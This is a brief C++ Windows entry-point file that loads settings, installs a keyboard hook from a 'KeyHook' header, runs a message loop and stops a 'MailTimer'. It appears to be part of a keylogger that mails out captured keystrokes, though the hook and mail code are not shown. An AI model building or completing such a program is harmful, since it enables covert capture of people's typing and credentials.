#include <windows.h>
#include "KeyHook.h"
#include "Settings.h"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
    Settings::Instance().Load("settings.ini");

    MSG Msg;

    InstallHook();

    while(GetMessage(&Msg, nullptr, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();

    return 0;
}